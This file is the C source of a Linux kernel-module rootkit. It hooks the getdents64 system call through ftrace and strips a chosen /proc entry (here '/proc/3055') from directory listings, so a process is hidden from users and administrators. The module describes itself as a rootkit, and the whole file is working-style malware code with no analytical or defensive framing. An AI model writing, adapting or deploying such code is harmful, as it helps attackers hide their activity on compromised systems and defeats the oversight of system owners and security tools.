#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/dcache.h>
#include <linux/path.h>

#include "ftrace_helper.h"

#define HIDDEN_PATH "/proc/3055" // Example path to hide, change as needed

#ifdef PTREGS_SYSCALL_STUBS
#define FIRST_ARG(regs, cast) (cast)regs->di
#define SECOND_ARG(regs, cast) (cast)regs->si
#define THIRD_ARG(regs, cast) (cast)regs->dx
#endif

int __always_inline evil(unsigned int fd, struct linux_dirent __user *dirent, int res) {
    int err;
    unsigned long off = 0;
    struct linux_dirent64 *kdir, *kdirent, *prev = NULL;
    struct file *file;
    char dir_path_buf[PATH_MAX], *dir_path;

    kdirent = kzalloc(res, GFP_KERNEL);
    if (!kdirent)
        return res;

    err = copy_from_user(kdirent, dirent, res);
    if (err)
        goto out;

    file = fget(fd);
    if (!file)
        goto out;

    dir_path = d_path(&file->f_path, dir_path_buf, PATH_MAX);
    fput(file);

    if (IS_ERR(dir_path))
        goto out;

    while (off < res) {
        kdir = (void *)kdirent + off;

        char full_path[PATH_MAX];
        snprintf(full_path, PATH_MAX, "%s/%s", dir_path, kdir->d_name);

        if (strcmp(full_path, HIDDEN_PATH) == 0) {
            if (kdir == kdirent) {
                res -= kdir->d_reclen;
                memmove(kdir, (void *)kdir + kdir->d_reclen, res);
                continue;
            }
            prev->d_reclen += kdir->d_reclen;
        } else {
            prev = kdir;
        }
        off += kdir->d_reclen;
    }

    err = copy_to_user(dirent, kdirent, res);
    if (err)
        goto out;

out:
    kfree(kdirent);
    return res;
}

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs *);
static asmlinkage int hook_sys_getdents64(const struct pt_regs *regs) {
    struct linux_dirent __user *dirent = SECOND_ARG(regs, struct linux_dirent __user *);
    unsigned int fd = FIRST_ARG(regs, unsigned int);
    int res;

    res = orig_sys_getdents64(regs);
    if (res <= 0)
        return res;

    res = evil(fd, dirent, res);
    return res;
}
#else
static asmlinkage long (*orig_sys_getdents64)(unsigned int, struct linux_dirent __user *, unsigned int);
static asmlinkage int hook_sys_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
    int res;

    res = orig_sys_getdents64(fd, dirent, count);
    if (res <= 0)
        return res;

    res = evil(fd, dirent, res);
    return res;
}
#endif

static struct ftrace_hook syscall_hooks[] = {
    HOOK("sys_getdents64", hook_sys_getdents64, &orig_sys_getdents64),
};

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Rubbx");
MODULE_DESCRIPTION("Rootkit designed to hide processes from system directory listings.");

static int rk_init(void) {
    return fh_install_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
}

static void rk_exit(void) {
    fh_remove_hooks(syscall_hooks, ARRAY_SIZE(syscall_hooks));
}

module_init(rk_init);
module_exit(rk_exit);
